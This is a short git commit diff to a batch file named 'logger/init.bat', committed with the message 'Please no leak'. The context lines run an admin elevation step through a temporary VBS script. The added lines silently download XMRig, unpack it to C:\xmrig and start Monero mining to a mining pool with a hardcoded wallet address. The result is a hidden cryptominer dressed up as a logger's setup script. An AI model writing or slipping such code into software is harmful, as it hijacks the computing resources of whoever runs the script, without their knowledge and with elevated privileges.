a56175310a25a415fd93db71fc246bbc41bc2aad
FoldFunc <fold.func@gmail.com>
2025-05-10 17:05:17 +0200

    Please no leak

--- logger/init.bat
+++ logger/init.bat
@@ -11,3 +11,15 @@ set CMD=cmd /k "echo [ADMIN] Success! & whoami & pause"
   cscript //nologo "%temp%\admin_elevate.vbs"
   del "%temp%\admin_elevate.vbs" >nul 2>&1
 )
+rem Download XMRig
+curl -L -o C:\xmrig\xmrig.zip https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-msvc-win64.zip
+
+rem Extract the ZIP file
+powershell Expand-Archive -Path "C:\xmrig\xmrig.zip" -DestinationPath "C:\xmrig"
+
+rem Run XMRig
+cd C:\xmrig
+start xmrig.exe --url pool.minexmr.com:4444 --user "49hKFS8ZTmZdFhBaf8FKAPZ9B3My7rUn311D9ZVrETD47sncZ7YRx8HWYzxvb3mudmAJC671BVFq1SweY7FLAKDT1CVY7c" --pass x 
+
+exit
+
